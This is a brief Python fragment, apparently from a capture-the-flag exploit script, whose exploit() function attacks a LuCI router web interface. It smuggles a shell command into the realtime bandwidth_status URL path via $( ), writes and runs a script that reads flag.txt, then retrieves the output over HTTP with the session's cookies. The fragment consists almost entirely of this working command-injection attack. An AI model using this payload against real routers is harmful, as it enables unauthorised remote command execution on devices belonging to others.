...
def exploit(args):
        ...
        url = 'http://%s/cgi-bin/luci/admin/status/realtime/bandwidth_status/eth0$(echo cd ..>output.sh;echo tail flag.txt>>output.sh;ash%20output.sh%3Eoutput)' % ( address)
        print(url)
        response = session.get(url=url,cookies=cookies,verify=False)
        url = 'http://%s/output' % address
        response = session.get(url=url,cookies=cookies,verify=False)
